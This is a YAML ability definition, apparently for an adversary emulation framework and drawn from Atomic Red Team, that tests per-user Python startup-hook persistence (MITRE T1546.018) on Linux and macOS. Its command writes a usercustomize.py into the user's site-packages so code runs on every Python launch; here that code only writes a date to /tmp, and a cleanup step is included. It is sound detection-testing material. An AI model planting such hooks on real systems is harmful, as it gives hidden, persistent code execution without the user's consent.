- id: 6e78084a-a433-4702-a838-cc7b765d87e8
  name: Python Startup Hook - usercustomize.py (Linux / MacOS)
  description: "Executes code via usercustomize.py. This is a per-user persistence\
    \ mechanism \nthat does not require root privileges."
  tactic: persistence
  technique:
    attack_id: T1546.018
    name: 'Event Triggered Execution: Python Startup Hooks'
  platforms:
    linux:
      sh:
        command: 'PYTHON_EXE=$(command -v python3 || command -v python); USER_PACKAGES=$($PYTHON_EXE
          -c "import site; print(site.getusersitepackages())"); mkdir -p "$USER_PACKAGES";
          echo "import os; os.system(''date > /tmp/poc.txt'')" > "$USER_PACKAGES/usercustomize.py";
          if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py
          created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*);
          else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi;
          $PYTHON_EXE -c "print(''Triggering Hook via usercustomize.py...'')"; if
          [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls
          -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found";
          fi'
        cleanup: "PYTHON_CMD=$(command -v #{python_exe} || command -v python); USER_PACKAGES=$($PYTHON_CMD\
          \ -S -c \"import site; print(site.getusersitepackages())\"); if [ ! -f /tmp/poc.txt\
          \ ] || [ ! -f $USER_PACKAGES/usercustomize.py ]; then echo \"[!] Artifact\
          \ missing: /tmp/poc.txt and $USER_PACKAGES/usercustomize.py \u2014 [-] Please\
          \ Run : Invoke-AtomicTest T1546.018\"; exit 0; fi; if [ -e \"$USER_PACKAGES\"\
          /usercustomize* ]; then echo \"[+] Successful remove $USER_PACKAGES/usercustomize.py\\\
          n\" $(rm -rf \"$USER_PACKAGES\"/usercustomize*); else echo \"usercustomize.py\
          \ not found under $USER_PACKAGES\"; fi; rm -rf /tmp/poc.txt; echo \"[+]\
          \ Successful remove poc.txt under /tmp\""
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - persistence
  - atomic-red-team
  - t1546.018
  author: Atomic Red Team
  additional_info:
    input_arguments:
      python_exe:
        description: The python binary name to test
        type: String
        default: python3
    dependencies:
    - description: 'Python must be installed and the specified binary (#{python_exe})
        must be in the PATH.

        '
      prereq_command: 'PYTHON_CMD=$(command -v #{python_exe} || command -v python)

        if [ -z "$PYTHON_CMD" ]; then exit 1; fi

        $PYTHON_CMD -m venv --help >/dev/null 2>&1

        '
      get_prereq_command: 'echo "Python not found. Please install Python using your
        package manager (e.g., Debian Based ''sudo apt-get update && sudo apt-get
        install -y python3 python3-venv'', RedHat / CentOS Based ''sudo yum install
        -y python3 python3-venv || sudo dnf install -y python3 python3-venv'', MacOS
        brew install python3 or brew install python@3.x or the macOS developer tools
        (''xcode-select --install''))."

        '
